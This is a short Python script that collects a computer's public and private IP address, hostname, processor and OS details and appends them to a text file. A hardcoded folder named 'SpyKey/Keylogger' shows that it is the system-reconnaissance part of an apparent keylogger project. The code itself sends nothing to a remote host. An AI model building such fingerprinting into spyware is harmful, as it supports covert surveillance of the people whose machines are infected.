import platform
import socket
from requests import get

# Function to retrieve computer information
def computer_information(file_path):
    with open(file_path + "/f_sysinfo.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Call the computer_information function
if __name__ == "__main__":
    file_path = "C:/Code/SpyKey/Keylogger"  # Enter the file path you want your files to be saved to
    computer_information(file_path)
